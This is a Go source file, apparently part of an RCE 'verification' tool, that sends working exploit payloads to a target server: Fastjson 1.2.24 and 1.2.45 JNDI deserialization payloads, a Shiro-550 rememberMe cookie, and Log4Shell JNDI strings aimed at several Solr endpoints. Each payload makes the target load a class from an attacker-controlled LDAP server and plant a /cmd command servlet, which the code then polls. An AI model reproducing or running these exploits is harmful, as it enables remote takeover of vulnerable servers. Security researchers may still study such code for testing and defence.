package rceverify

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"
)

// VerifyFastjson1224 sends a Fastjson 1.2.24 JNDI payload and polls /cmd.
func (s *Server) VerifyFastjson1224(base string) (map[string]string, error) {
	payload := fmt.Sprintf(`{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"%s","autoCommit":true}}`, s.LDAPURL())
	return s.sendFastjson(base, payload, "Fastjson 1.2.24")
}

// VerifyFastjson1245 sends a Fastjson 1.2.45 Class-cache bypass payload.
func (s *Server) VerifyFastjson1245(base string) (map[string]string, error) {
	payload := fmt.Sprintf(
		`{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"%s","autoCommit":true}}`,
		s.LDAPURL())
	return s.sendFastjson(base, payload, "Fastjson 1.2.45")
}

func (s *Server) sendFastjson(base, payload, name string) (map[string]string, error) {
	req, err := http.NewRequest("POST", strings.TrimRight(base, "/")+"/", bytes.NewReader([]byte(payload)))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", "application/json")
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("%s send: %w", name, err)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()
	log.Printf("[%s] payload sent, HTTP %d, waiting for /cmd...", name, resp.StatusCode)
	time.Sleep(3 * time.Second)
	out := s.RunAll(base)
	return out, nil
}

// VerifyShiro550 sends a Shiro-550 rememberMe cookie with pre-built serialized payload.
// The serialized bytes must be generated offline (ShiroJNDI.java) and AES-CBC encrypted.
// This function takes the base64-encoded cookie and sends it.
func (s *Server) VerifyShiro550(base, base64Cookie string) (map[string]string, error) {
	req, _ := http.NewRequest("GET", strings.TrimRight(base, "/")+"/", nil)
	req.Header.Set("Cookie", "rememberMe="+base64Cookie)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("shiro send: %w", err)
	}
	io.ReadAll(resp.Body)
	resp.Body.Close()
	log.Printf("[shiro] cookie sent, HTTP %d", resp.StatusCode)
	time.Sleep(2 * time.Second)
	out := s.RunAll(base)
	return out, nil
}

// VerifyLog4jSolr 对 Solr(<=8.11.0, log4j2 2.14.1) 触发 CVE-2021-44228：
// 请求参数会被 Solr 记录进日志，${jndi:...} 在 log4j 渲染时被解析。
// 打多个已知会被记录的 sink，任一触发即加载远程类植入 /cmd servlet。
func (s *Server) VerifyLog4jSolr(base string) (map[string]string, error) {
	jndi := "${jndi:" + s.LDAPURL() + "}"
	sinks := []string{
		"/solr/admin/cores?indexInfo=false&wt=json&foo=" + url.QueryEscape(jndi),
		"/solr/admin/info/system?wt=json&foo=" + url.QueryEscape(jndi),
		"/solr/demo/select?q=" + url.QueryEscape(jndi) + "&wt=json",
	}
	for _, p := range sinks {
		resp, err := http.Get(strings.TrimRight(base, "/") + p)
		if err != nil {
			return nil, fmt.Errorf("log4j-solr send %s: %w", p, err)
		}
		io.ReadAll(resp.Body)
		resp.Body.Close()
		log.Printf("[log4j-solr] %s -> HTTP %d", p, resp.StatusCode)
	}
	time.Sleep(5 * time.Second)
	return s.RunAll(base), nil
}
